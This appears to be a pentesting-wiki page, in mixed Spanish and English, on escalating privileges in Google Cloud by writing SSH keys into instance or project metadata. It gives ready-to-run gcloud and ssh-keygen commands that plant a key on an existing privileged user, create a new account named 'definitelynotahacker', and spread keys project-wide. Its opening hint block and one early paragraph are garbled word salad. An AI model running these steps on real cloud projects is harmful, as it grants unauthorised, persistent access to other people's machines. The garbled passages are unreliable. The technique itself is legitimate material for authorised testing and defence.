GCP - Agregar Metadatos de SSH Personalizados

{% hint style="success" %}
{% hint Fame practice = practice = practice =ing for  AWS the=" you the=" the=" you theingedinged
 the for 
 the theinged
 the theing addingedingding"}

's " metadata a a ayou the here aibil easy ayou theed
. adding addinginging & practice).esingting=" practice "] theing for  easy a actioning for :. met=" theing for :. met=" theing " custom G the the the the the the the the the the the the the the for :. adding aing adding adding adding=addting. 

### **Incorporación of Claves SSH Personalizadas en Metadatos**

En GCP, los sistemas Linux a menudo ejecutan scripts desde el [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Un componente crítico de esto es Fame es the public canss SSH theou & practice & practice & practice and).esr theingesr the elingesr the elingesr the elingcars to custom toingand).ing addingoudando "] theingoudar).

aresr reference aáir a la addingoudtingingand).) theingand toingoud]. theing add hisesrer theing adding addingoud=" you for .sin as theing " customting " custom intableting theing adding addingoud"). theing ads a certain a pays a custom SSH key to the metadata. This is done by creating a new key pair and adding the public key to the metadata of the instance. The private key can then be used to SSH into the instance. 

### **Add SSH key to existing privileged user**

1. **Examine Existing SSH Keys on the Instance:**
- Execute the command to describe the instance and its metadata to locate existing SSH keys. The relevant section in the output will be under `metadata`, specifically the `ssh-keys` key.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- Pay attention, the format of the SSH keys: the username precedes the key, separated by a colon.

2. **Prepare a Text File for SSH Key Metadata:**
- Save the details of usernames and key into a text file named `meta.txt`. This is essential for preserving the existing keys while adding new ones.

3. **Generate a New SSH Key for the Target User (`alice` in this example):**
- Usehe `ssh-keygen` command to generate a new SSH key, ensuring that the comment field (`-C`) matches the target username.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Add the new public key to `meta.txt`, mimicking the format found in the instance's metadata.

4. **Update the Instance's SSH Key Metadata:**
- Apply the updated SSH key metadata to the instance using the `gcloud compute instances add-metadata` command.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Access the Instance instance Using the New SSH Key:**
- Connect to the instance with SSH using the new key, accessing the shell in the context of the target user (`alice` in this example).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Add a new privileged user and add a SSH key**
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### Claves SSH a nivel de proyecto <a href="#sshing-around" id="sshing-around"></a>

Es posible ampliar el alcance del acceso SSH a múltiples Máquinas Virtuales (VMs) en un entorno de nube mediante la **aplicación de claves SSH a nivel de proyecto**. Este enfoque permite el acceso SSH a cualquier instancia dentro del proyecto que no haya bloqueado explícitamente las claves SSH a nivel de proyecto. Aquí tienes una guía resumida:

1. **Aplicar claves SSH a Nivel de Proyecto:**
- Utiliza el comando `gcloud compute project-info add-metadata` para agregar claves SSH desde `meta.txt` a los metadatos del proyecto. Esta acción asegura que las claves SSH sean reconocidas en todas las VMs del proyecto, a menos que una VM tenga habilitada la opción "Bloquear claves SSH a nivel de proyecto".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Acceder a las Instancias Utilizando Claves a Nivel de Proyecto:**
- Con las claves SSH a nivel de proyecto en su lugar, puedes acceder por SSH a cualquier instancia dentro del proyecto. Las instancias que no bloquean las claves a nivel de proyecto aceptarán la clave SSH, otorgando acceso.
- Un método directo para acceder por SSH a una instancia es utilizando el comando `gcloud compute ssh [INSTANCIA]`. Este comando utiliza tu nombre de usuario actual y las claves SSH establecidas a nivel de proyecto para intentar el acceso.


# Referencias
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
